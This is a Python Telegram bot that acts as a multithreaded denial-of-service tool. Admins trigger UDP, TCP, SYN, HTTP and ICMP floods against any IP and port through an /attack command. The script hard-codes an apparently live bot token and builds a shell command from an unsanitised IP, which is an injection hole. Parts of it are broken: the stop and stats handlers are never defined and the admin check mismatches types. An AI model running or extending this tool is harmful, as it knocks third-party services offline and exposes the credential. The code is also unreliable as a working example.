#!/usr/bin/env python3
import os
import logging
import json
import time
import random
import threading
import socket
import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# Configuration
TOKEN = "7519734348:AAH6grCtysibCCb62AXxgIx9lydeB9wMHhQ"
ADMINS_FILE = "admins.json"
USERS_FILE = "users.json"

# Initial setup
try:
    with open(ADMINS_FILE, "r") as f:
        ADMINS = json.load(f)
except FileNotFoundError:
    ADMINS = [12345678]  # Initial Admin ID

try:
    with open(USERS_FILE, "r") as f:
        USERS = json.load(f)
except FileNotFoundError:
    USERS = {}  # {user_id: {"approved": False, "username": "", "expiry": None}}

# Global variables
is_attacking = False
attack_threads = []
max_threads = 1000  # Maximum threads available

# Logging setup
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Stylish and Unique AM Welcome Banner
WELCOME_BANNER = """
\033[95m
 █████╗ ███╗   ███╗
██╔══██╗████╗ ████║
███████║██╔████╔██║
██╔══██║██║╚██╔╝██║
██║  ██║██║ ╚═╝ ██║
╚═╝  ╚═╝╚═╝     ╚═╝
\033[0m
\033[96m
🚀 **Welcome to AM Network Toolkit** 🚀
🔐 **The Ultimate Tool for Network Testing**
💻 **Games | Apps | Websites | Servers**
\033[0m
"""

# Welcome Message
WELCOME_MESSAGE = f"""
{WELCOME_BANNER}
✨ **Features** ✨
✅ UDP Flood
✅ TCP Flood
✅ SYN Flood
✅ HTTP Flood
✅ ICMP Flood
✅ Powerful Multi-Threaded Attacks

📌 **Commands**:
/help - Show all commands
/request - Request admin approval

🔒 **Note**: Unauthorized usage is strictly prohibited.
"""

# File operations
def save_admins():
    with open(ADMINS_FILE, "w") as f:
        json.dump(ADMINS, f)

def save_users():
    with open(USERS_FILE, "w") as f:
        json.dump(USERS, f)

async def is_admin(update: Update):
    return str(update.effective_user.id) in ADMINS

async def is_approved(user_id):
    user_data = USERS.get(str(user_id), {})
    if user_data.get("approved", False):
        if user_data.get("expiry") and time.time() > user_data["expiry"]:
            user_data["approved"] = False
            save_users()
            return False
        return True
    return False

# Command handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    username = update.effective_user.username or "N/A"
    
    if user_id not in USERS:
        USERS[user_id] = {"approved": False, "username": username, "expiry": None}
        save_users()
    
    await update.message.reply_text(WELCOME_MESSAGE)

async def help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
🔧 **Admin Commands**:
/approve [USER_ID] [DURATION] - Approve a user
/removeuser [USER_ID] - Remove a user
/listusers - List all users
/attack [TYPE] [IP] [PORT] [DURATION] - Start attack
/stop - Stop all attacks
/stats - Show attack status

🔧 **User Commands**:
/help - Show this help
/request - Request admin approval

🔧 **Attack Types**:
udp - UDP Flood
tcp - TCP Flood
syn - SYN Flood
http - HTTP Flood
icmp - ICMP Flood
    """
    await update.message.reply_text(help_text)

# Attack functions
def generate_packet(size):
    return bytes(random.randint(0, 255) for _ in range(size))

def udp_flood(ip, port, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                sock.sendto(generate_packet(1024), (ip, port))
        except Exception as e:
            logger.error(f"UDP error: {str(e)}")

def tcp_flood(ip, port, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.connect((ip, port))
                sock.send(generate_packet(2048))
        except Exception as e:
            logger.error(f"TCP error: {str(e)}")

def syn_flood(ip, port, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.setblocking(False)
                sock.connect_ex((ip, port))
        except Exception as e:
            logger.error(f"SYN error: {str(e)}")

def http_flood(url, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            requests.get(url)
        except Exception as e:
            logger.error(f"HTTP error: {str(e)}")

def icmp_flood(ip, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            os.system(f"ping -c 1 {ip}")
        except Exception as e:
            logger.error(f"ICMP error: {str(e)}")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_attacking, attack_threads
    
    if not await is_admin(update):
        return

    if is_attacking:
        await update.message.reply_text("🚨 Attack already running! Use /stop first")
        return

    try:
        attack_type = context.args[0].lower()
        ip = context.args[1]
        port = int(context.args[2]) if len(context.args) > 2 else 80
        duration = int(context.args[3]) if len(context.args) > 3 else 60
    except (IndexError, ValueError):
        await update.message.reply_text("⚠️ Invalid format!\nExample: /attack udp 1.1.1.1 80 120")
        return

    is_attacking = True
    attack_threads = []
    
    # Start attack based on type
    if attack_type == "udp":
        for _ in range(max_threads // 2):
            t = threading.Thread(target=udp_flood, args=(ip, port, duration))
            t.daemon = True
            t.start()
            attack_threads.append(t)
    elif attack_type == "tcp":
        for _ in range(max_threads // 2):
            t = threading.Thread(target=tcp_flood, args=(ip, port, duration))
            t.daemon = True
            t.start()
            attack_threads.append(t)
    elif attack_type == "syn":
        for _ in range(max_threads // 2):
            t = threading.Thread(target=syn_flood, args=(ip, port, duration))
            t.daemon = True
            t.start()
            attack_threads.append(t)
    elif attack_type == "http":
        for _ in range(max_threads // 2):
            t = threading.Thread(target=http_flood, args=(ip, duration))
            t.daemon = True
            t.start()
            attack_threads.append(t)
    elif attack_type == "icmp":
        for _ in range(max_threads // 2):
            t = threading.Thread(target=icmp_flood, args=(ip, duration))
            t.daemon = True
            t.start()
            attack_threads.append(t)
    else:
        await update.message.reply_text("⚠️ Invalid attack type!\nUse /help for available types")
        return

    await update.message.reply_text(
        f"🔥 {attack_type.upper()} Flood started!\n"
        f"Target: {ip}:{port}\n"
        f"Duration: {duration} seconds\n"
        f"Threads: {max_threads}"
    )

    # Auto-stop after duration
    time.sleep(duration)
    is_attacking = False
    await update.message.reply_text(f"🛑 Attack on {ip}:{port} completed!")

# Main function
def main():
    # Initialize files
    if not os.path.exists(ADMINS_FILE):
        save_admins()
    if not os.path.exists(USERS_FILE):
        save_users()

    # Create application
    application = Application.builder().token(TOKEN).build()

    # Add handlers
    handlers = [
        CommandHandler("start", start),
        CommandHandler("help", help),
        CommandHandler("attack", attack),
        CommandHandler("stop", stop),
        CommandHandler("stats", stats),
    ]
    
    for handler in handlers:
        application.add_handler(handler)

    # Start bot
    application.run_polling()

if __name__ == "__main__":
    main()